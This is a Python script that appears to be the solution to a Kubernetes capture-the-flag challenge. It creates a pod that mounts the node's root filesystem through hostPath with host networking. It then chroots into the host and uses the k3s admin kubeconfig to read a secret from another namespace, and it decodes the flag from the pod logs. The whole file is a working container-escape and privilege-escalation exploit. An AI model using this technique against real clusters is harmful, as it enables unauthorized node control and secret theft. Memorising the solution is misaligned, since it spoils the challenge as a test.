#!/usr/bin/env python3

import base64
import re
import subprocess
import sys
import time
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
KUBECONFIG = BASE_DIR / "kubeconfig.yaml"
NAMESPACE = "maintenance"
POD_NAME = "quiet-witness-solve"


def run(args, *, input_text=None, check=True):
    proc = subprocess.run(
        args,
        input=input_text,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=30,
    )
    if check and proc.returncode != 0:
        raise RuntimeError(
            f"command failed: {' '.join(args)}\nstdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
        )
    return proc


def kubectl(*args, input_text=None, check=True):
    return run(
        ["kubectl", "--kubeconfig", str(KUBECONFIG), "-n", NAMESPACE, *args],
        input_text=input_text,
        check=check,
    )


def cleanup():
    kubectl("delete", "pod", POD_NAME, "--ignore-not-found", "--wait=false", check=False)


def main():
    if not KUBECONFIG.exists():
        raise SystemExit(f"missing kubeconfig: {KUBECONFIG}")

    cleanup()
    manifest = f"""
apiVersion: v1
kind: Pod
metadata:
  name: {POD_NAME}
  namespace: {NAMESPACE}
spec:
  restartPolicy: Never
  automountServiceAccountToken: false
  hostNetwork: true
  containers:
  - name: audit
    image: busybox:1.36
    command: ["sh", "-c"]
    args:
    - |
      echo FLAG_B64_BEGIN
      chroot /host /usr/local/bin/k3s kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml \\
        -n findings get secret witness-findings -o jsonpath='{{.data.flag}}'
      echo
      echo FLAG_B64_END
    volumeMounts:
    - name: hostroot
      mountPath: /host
      readOnly: true
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
"""
    kubectl("apply", "-f", "-", input_text=manifest)

    try:
        for _ in range(20):
            phase = kubectl(
                "get",
                "pod",
                POD_NAME,
                "-o",
                "jsonpath={.status.phase}",
                check=False,
            ).stdout.strip()
            if phase in {"Succeeded", "Failed"}:
                break
            time.sleep(2)
        else:
            raise RuntimeError("pod did not finish before timeout")

        logs = kubectl("logs", POD_NAME, "--tail=-1").stdout
        match = re.search(r"FLAG_B64_BEGIN\s*([A-Za-z0-9+/=]+)\s*FLAG_B64_END", logs)
        if not match:
            raise RuntimeError(f"flag marker not found in pod logs:\n{logs}")

        flag = base64.b64decode(match.group(1)).decode().strip()
        if not re.fullmatch(r"[A-Za-z0-9_:-]*ctf\{[^}]+\}", flag, re.IGNORECASE):
            raise RuntimeError(f"decoded value does not look like a flag: {flag!r}")

        print(flag)
    finally:
        cleanup()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        sys.exit(1)
